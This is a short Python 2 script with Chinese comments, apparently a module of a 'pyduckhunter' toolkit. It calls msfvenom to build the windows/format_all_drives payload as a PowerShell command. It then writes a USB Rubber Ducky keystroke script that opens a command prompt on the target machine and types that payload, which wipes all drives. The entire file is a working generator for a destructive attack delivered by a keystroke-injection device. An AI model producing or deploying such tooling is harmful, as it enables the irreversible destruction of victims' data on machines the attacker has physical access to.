#!/usr/bin/python env
#-*-coding:utf-8-*-
#####powershell_Excure_format_all_drievs#####
#####直接powershell执行格式化全盘的payload，ps：加载代码世间很长#####
import sys,os
sys.dont_write_bytecode = True
def Excute():
    name = raw_input("\n[\033[1;32;1mpyduckhunter>\033[0m] 请输入格式化之后的盘符:")
    def msfvenom(name):
        c = "msfvenom -p windows/format_all_drives VOLUMELABEL=" + name + " -f psh-cmd"
        return c
    shellout = os.popen(msfvenom(name)).read()

    f = open('output/Powershell_Execute_format_all_drives.txt', 'w')

    f.write("CAPSLOCK\n")

    f.write("DELAY 1000\n")

    f.write("GUI r\n")

    f.write("DELAY 1000\n")

    f.write("STRING cmd\n")

    f.write("DELAY 1000\n")

    f.write("STRING ")

    f.write(shellout.swapcase())

    f.write("\n")

    f.write("CAPSLOCK")

    f.close()

    f = open('output/Powershell_Execute_format_all_drives.txt', 'r')

    f.readlines()

    print "[\033[1;32;1m+\033[0m] 文件生成在 output/Powershell_Execute_format_all_drives.txt"